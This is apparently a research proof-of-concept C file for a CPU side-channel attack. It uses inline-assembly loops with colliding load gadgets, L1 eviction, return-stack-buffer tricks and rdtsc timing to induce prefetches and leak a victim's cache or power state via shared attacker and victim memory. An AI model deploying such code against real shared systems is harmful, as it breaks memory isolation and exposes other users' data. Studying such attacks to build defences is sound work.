// make sure sched stuff works
#define _GNU_SOURCE

#include "common.h"

#include <fcntl.h>
#include <pthread.h>
#include <sched.h>
#include <signal.h>
#include <stdio.h>
#include <sys/mman.h>
#include <time.h>
#include <unistd.h>

// colliding load instruction
static load_gadget_f gadget;

// colliding buffer
static uint8_t *colliding_buffer = NULL;

// victim buffer
static uint8_t *victim_buffer = NULL;

// victim gadget
static load_gadget_f victim_gadget;

// threshold to distinguish cache hit from cache miss
static uint64_t threshold;

// buffer for l1 eviction
static uint8_t *eviction_buffer;

#define XSTR(s) STR(s)
#define STR(s)  #s

#define STRIDE     256
#define STRIDE_ASM "$" XSTR(STRIDE)

// set to 1 if hits should be counted inside the assembly loop
#define COUNT_HITS_IN_ASM 0

// set to 1 if access time should be measured after assembly loop
#define MEASURE_ACCESS_TIME 0

// MEASURE_ACCESS_TIME is stupid with COUNT_HITS_IN_ASM as this will flush the probed line
#if ( COUNT_HITS_IN_ASM == 1 && MEASURE_ACCESS_TIME == 1 )
#warning COUNT_HITS_IN_ASM should not be used with MEASURE_ACCESS_TIME as MEASURE_ACCESS_TIME will only measure cache misses if COUNT_HITS_IN_ASM is enabled.
#endif /* COUNT_HITS_IN_ASM && MEASURE_ACCESS_TIME */

/* copy pasted collide + power stuff */

static char const *SHM_ATTACKER = "/shm_attacker";
static char const *SHM_VICTIM   = "/shm_victim";

static uint8_t *cp_attacker;
static uint8_t *cp_victim;

// pin pthread to specific core
uint8_t pin_to_exact_thread_pthread(pthread_t thread, uint8_t core) {
    cpu_set_t cpuset;
    CPU_ZERO(&cpuset);
    CPU_SET(core, &cpuset);
    int ret = pthread_setaffinity_np(thread, sizeof(cpuset), &cpuset);
    if ( ret ) {
        printf("setaffinity failed\n");
        exit(-1);
    }
    ret = pthread_getaffinity_np(thread, sizeof(cpuset), &cpuset);
    if ( ret ) {
        printf("getaffinity failed\n");
        exit(-1);
    }
    if ( CPU_ISSET(core, &cpuset) == 0 ) {
        printf("core setting failed\n");
        exit(-1);
    }
    return core;
}

static uint8_t *get_shm(char const *shm_name) {
    int fd = shm_open(shm_name, O_RDONLY, S_IRUSR | S_IWUSR);
    if ( fd < 0 ) {
        perror("shm_open");
        return NULL;
    }
    void *addr = mmap(NULL, 0x1000, PROT_READ, MAP_SHARED, fd, 0);
    if ( addr == MAP_FAILED ) {
        perror("mmap");
        return NULL;
    }
    return (uint8_t *)addr;
}

static void signal_handler(int signum) {
    if ( signum == SIGUSR1 ) {
        if ( colliding_buffer ) {
            for ( int i = 0; i < 16; ++i ) {
                memset(eviction_buffer + i * 4096 + (3 * STRIDE), *cp_attacker, 64);
            }
        }
        if ( victim_buffer ) {
            memset(victim_buffer + (3 * STRIDE), *cp_victim, 64);
        }
    }
}

/* end copy pasted collide + power stuff */

void collide_power_loop_ref() {
    for ( ;; ) {
        asm volatile(
            // evict l1
            "mov 0x00000(%[eviction_buf]), %[tmp]\n"
            "mov 0x01000(%[eviction_buf]), %[tmp]\n"
            "mov 0x02000(%[eviction_buf]), %[tmp]\n"
            "mov 0x03000(%[eviction_buf]), %[tmp]\n"
            "mov 0x04000(%[eviction_buf]), %[tmp]\n"
            "mov 0x05000(%[eviction_buf]), %[tmp]\n"
            "mov 0x06000(%[eviction_buf]), %[tmp]\n"
            "mov 0x07000(%[eviction_buf]), %[tmp]\n"
            "mov 0x08000(%[eviction_buf]), %[tmp]\n"

            // access line directly
            "mov (%[target_mem]), %[tmp]\n"
            :
            : [eviction_buf] "r"(eviction_buffer + 3 * STRIDE), [target_mem] "r"(victim_buffer + 3 * STRIDE), [tmp] "r"(0));
    }
}

void collide_power_loop_rsb() {
    for ( ;; ) {
        asm volatile(
            // evict l1
            "mov 0x00000(%[eviction_buf]), %[tmp]\n"
            "mov 0x01000(%[eviction_buf]), %[tmp]\n"
            "mov 0x02000(%[eviction_buf]), %[tmp]\n"
            "mov 0x03000(%[eviction_buf]), %[tmp]\n"
            "mov 0x04000(%[eviction_buf]), %[tmp]\n"
            "mov 0x05000(%[eviction_buf]), %[tmp]\n"
            "mov 0x06000(%[eviction_buf]), %[tmp]\n"
            "mov 0x07000(%[eviction_buf]), %[tmp]\n"
            "mov 0x08000(%[eviction_buf]), %[tmp]\n"

            "1:                                  \n"
            "call 2f                             \n"
            // access line directly
            "mov (%[target_mem]), %[tmp]         \n"
            "lfence                              \n"

            "2:                               \n"
            "    lea 4f(%%rip), %%rax         \n"
            "    movq %%rax, (%%rsp)          \n"
            "    ret                          \n"
            "4:                               \n"
            "    nop                          \n"

            :
            : [eviction_buf] "r"(eviction_buffer + 3 * STRIDE), [target_mem] "r"(victim_buffer + 3 * STRIDE), [tmp] "r"(0), "a"(0));
    }
}

void collide_power_loop() {
    for ( ;; ) {
        uint64_t hits = 0;
        asm volatile("mov $0, %%r10\n"

                     // label to jump to
                     "loop:\n"

                     // evict L1
                     "mov 0x00000(%[eviction_buf]), %%rax\n"
                     "mov 0x01000(%[eviction_buf]), %%rax\n"
                     "mov 0x02000(%[eviction_buf]), %%rax\n"
                     "mov 0x03000(%[eviction_buf]), %%rax\n"
                     "mov 0x04000(%[eviction_buf]), %%rax\n"
                     "mov 0x05000(%[eviction_buf]), %%rax\n"
                     "mov 0x06000(%[eviction_buf]), %%rax\n"
                     "mov 0x07000(%[eviction_buf]), %%rax\n"
                     "mov 0x08000(%[eviction_buf]), %%rax\n"

                     // fence
                     "mfence\n"

                     // trigger prefetching (hopefully)
                     "mov %[colliding_buffer], %%rdi\n"
                     "call *%[gadget]\n" // gadget(colliding_buffer + 0 * STRIDE)
                     "add " STRIDE_ASM ", %%rdi\n"
                     "call *%[gadget]\n" // gadget(colliding_buffer + 1 * STRIDE)
                     "mov %[victim_buffer], %%rdi\n"
                     "add " STRIDE_ASM ", %%rdi\n"
                     "add " STRIDE_ASM ", %%rdi\n"
                     "call *%[victim_gadget]\n" // victim_gadget(victim_buffer + 2 * STRIDE)
                     // second iteration
                     "mov %[colliding_buffer], %%rdi\n"
                     "call *%[gadget]\n" // gadget(colliding_buffer + 0 * STRIDE)
                     "add " STRIDE_ASM ", %%rdi\n"
                     "call *%[gadget]\n" // gadget(colliding_buffer + 1 * STRIDE)
                                         // uncomment to make it slightly more reliable
                                         //            "mov %[victim_buffer], %%rdi\n"
                                         //            "add " STRIDE_ASM ", %%rdi\n"
                                         //            "add " STRIDE_ASM ", %%rdi\n"
                                         //            "call *%[victim_gadget]\n"   // victim_gadget(victim_buffer + 2 * STRIDE)

                     // reset predictor state
                     "mov %[colliding_buffer], %%rdi\n"
                     "add " STRIDE_ASM ", %%rdi\n"
                     "add " STRIDE_ASM ", %%rdi\n"
                     "add " STRIDE_ASM ", %%rdi\n"
                     "add " STRIDE_ASM ", %%rdi\n"
                     "add " STRIDE_ASM ", %%rdi\n"
                     "add " STRIDE_ASM ", %%rdi\n"
                     "add " STRIDE_ASM ", %%rdi\n"
                     "add " STRIDE_ASM ", %%rdi\n"
                     "add " STRIDE_ASM ", %%rdi\n"
                     "add " STRIDE_ASM ", %%rdi\n"
                     "call *%[gadget]\n" // gadget(colliding_buffer + 10 * STRIDE)
                     "sub " STRIDE_ASM ", %%rdi\n"
                     "call *%[gadget]\n" // gadget(colliding_buffer +  9 * STRIDE)
                     "sub " STRIDE_ASM ", %%rdi\n"
                     "call *%[gadget]\n" // gadget(colliding_buffer +  8 * STRIDE)

#if ( COUNT_HITS_IN_ASM == 1 )
                     // check whether prefetching happened (for really poc, this will be replaced with a mfence)
                     "mov %[victim_buffer], %%rdi\n"
                     "add " STRIDE_ASM ", %%rdi\n"
                     "add " STRIDE_ASM ", %%rdi\n"
                     "add " STRIDE_ASM ", %%rdi\n"
                     "mfence\n"
                     "rdtsc\n"
                     "mfence\n"
                     "mov (%%rdi), %%rdi\n"
                     "mfence\n"
                     "shl $32, %%rdx\n"
                     "or %%rax, %%rdx\n"
                     "mov %%rdx, %%rdi\n"
                     "rdtsc\n"
                     "mfence\n"
                     "shl $32, %%rdx\n"
                     "or %%rax, %%rdx\n"
                     "sub %%rdi, %%rdx\n"
                     "cmp $140, %%rdx\n"
                     "ja nohit\n"
                     "add $1, %[hits_o]\n"
                     "nohit:\n"

                     // flush possibly prefetched address
                     "mov %[victim_buffer], %%rdi\n"
                     "add " STRIDE_ASM ", %%rdi\n"
                     "add " STRIDE_ASM ", %%rdi\n"
                     "add " STRIDE_ASM ", %%rdi\n"
                     "clflush (%%rdi)\n"
#else
                     "mfence\n"
#endif /* COUNT_HITS_IN_ASM */

                     // run loop again
                     //"inc %%r10\n"
                     //"cmp $1000000, %%r10\n"
                     "jmp loop\n"

                     : [hits] "=r"(hits)
                     : [hits_o] "0"(hits), [eviction_buf] "r"(eviction_buffer + 3 * STRIDE), [colliding_buffer] "r"(colliding_buffer), [gadget] "r"(gadget),
                       [victim_buffer] "r"(victim_buffer), [victim_gadget] "r"(victim_gadget)
                     : "rax", "rdx", "rdi", "r10");

#if ( COUNT_HITS_IN_ASM == 1 )
        printf("hits: %zu\n", hits);
#endif /* COUNT_HITS_IN_ASM */

#if ( MEASURE_ACCESS_TIME == 1 )
        printf("time: %zu\n", probe(&victim_buffer[3 * STRIDE]));
        flush(&victim_buffer[3 * STRIDE]);
#endif /* MEASURE_ACCESS_TIME */
    }
}

int main(int argc, char **argv) {
    /* copy pasted collide + power stuff */

    if ( argc != 2 ) {
        printf("usage!\n");
        return -1;
    }

    pin_to_exact_thread_pthread(pthread_self(), strtol(argv[1], NULL, 10));

    signal(SIGUSR1, signal_handler);

    cp_attacker = get_shm(SHM_ATTACKER);
    cp_victim   = get_shm(SHM_VICTIM);

    /* end copy pasted collide + power stuff */

    // map buffer for l1 eviction
    eviction_buffer = map_buffer(0xdead000ull, PAGE_SIZE * 16);

    // map colliding load instructions
    gadget        = map_gadget(0xcafe1337);
    victim_gadget = map_gadget(0x1cafe1337);

    // map colliding buffers
    colliding_buffer = map_buffer(0x12abba000ull, PAGE_SIZE * 10); 
    victim_buffer    = map_buffer(0x91abba000ull, PAGE_SIZE * 10); 

    // calculate threshold to distinguish cache hit from cache miss
    threshold = calculate_threshold();
    printf("threshold: %zu\n", threshold);

    // run prefetching loop
    collide_power_loop_rsb();
}
